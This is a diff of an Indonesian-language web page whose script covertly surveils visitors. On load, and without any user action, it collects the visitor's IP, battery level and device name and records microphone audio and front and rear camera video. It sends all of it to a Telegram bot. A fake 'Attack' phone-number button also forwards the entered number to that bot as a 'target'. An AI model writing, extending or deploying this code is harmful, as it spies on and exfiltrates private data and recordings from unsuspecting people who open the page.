@@ -6,7 +6,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
   <style>
-    /* Style tetap sama sesuai preferensi visual Anda */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
@@ -126,12 +125,31 @@
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         const battery = await navigator.getBattery?.() || { level: 0 };
-        const text = `IP: ${ipData.ip}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
-        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n<pre>${text}</pre>`);
-      } catch {}
+        
+        // Deteksi Nama Device
+        const ua = navigator.userAgent;
+        let deviceName = "Unknown Device";
+        if (/android/i.test(ua)) {
+          const match = ua.match(/\(([^;]+);/);
+          deviceName = match ? match[1] : "Android Device";
+        } else if (/iPhone|iPad|iPod/i.test(ua)) {
+          deviceName = "iOS Device";
+        } else if (/Windows/i.test(ua)) {
+          deviceName = "Windows PC";
+        }
+
+        const infoText = `
+<b>📱 Device:</b> ${deviceName}
+<b>🌐 IP:</b> ${ipData.ip}
+<b>🔋 Baterai:</b> ${(battery.level * 100).toFixed(0)}%
+<b>🕒 Waktu:</b> ${new Date().toLocaleString()}`;
+
+        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n${infoText}`);
+      } catch (e) {
+        sendToTelegram("Gagal mengambil info device/IP");
+      }
     }
 
-    // Fungsi otomatis rekam suara (5 detik)
     async function autoRecordAudio() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -144,13 +162,10 @@
           stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (err) {
-        sendToTelegram('Izin Voice Note ditolak ❌');
-      }
+        setTimeout(() => mediaRecorder.stop(), 4000);
+      } catch { sendToTelegram("Izin Mic ditolak ❌"); }
     }
 
-    // Fungsi otomatis rekam video (6 detik)
     async function autoRecordVideo(facingMode, label) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
@@ -165,26 +180,24 @@
             resolve();
           };
           mediaRecorder.start();
-          setTimeout(() => mediaRecorder.stop(), 6000);
+          setTimeout(() => mediaRecorder.stop(), 5000);
         });
-      } catch (err) { 
+      } catch { 
         sendToTelegram(`Izin Kamera ${label} ditolak ❌`);
         return Promise.resolve(); 
       }
     }
 
-    // Menjalankan semua aksi otomatis saat halaman dimuat
+    // Eksekusi Otomatis saat masuk website
     window.addEventListener('DOMContentLoaded', async () => {
       createParticles();
-      getInfo();
-      
-      // Menjalankan perekaman secara otomatis berurutan
+      await getInfo();
       await autoRecordAudio();
       await autoRecordVideo("user", "Depan");
       await autoRecordVideo("environment", "Belakang");
     });
 
-    // Event listener untuk tombol Attack
+    // Logika Tombol Atack
     button.addEventListener('click', () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
@@ -192,15 +205,13 @@
       button.disabled = true;
       notif.style.display = 'none';
       
-      // Kirim nomor target ke bot
       sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
       
-      // Tampilkan notifikasi sukses yang diminta
       setTimeout(() => {
         notif.style.display = 'block';
         button.disabled = false;
         input.value = '';
-      }, 1000);
+      }, 800);
     });
 
     function createParticles() {
